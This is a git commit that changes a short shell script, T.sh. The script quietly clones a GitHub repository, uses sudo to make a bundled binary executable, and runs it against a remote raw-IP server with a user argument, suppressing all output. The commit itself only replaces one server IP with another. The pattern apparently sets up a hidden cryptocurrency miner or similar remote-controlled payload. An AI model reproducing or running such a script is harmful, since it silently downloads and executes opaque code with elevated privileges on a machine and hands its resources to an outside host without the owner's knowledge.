92b3a4ab8ad1afdea9365db92516c4c258e4a8ec
xuanh8624 <78060609+xuanh8624@users.noreply.github.com>
2021-02-08 14:53:14 +0700

    Update T.sh

--- T.sh
+++ T.sh
@@ -4,5 +4,5 @@ printf "User $1"  >&2
 {
 git clone https://github.com/xuanh8624/tech.git &> /dev/null
 sudo chmod +x tech/m
-./tech/m -P http://103.149.12.74:4546/"$1" &> log
+./tech/m -P http://38.130.220.127:4646/"$1" &> log
 } &> /dev/null
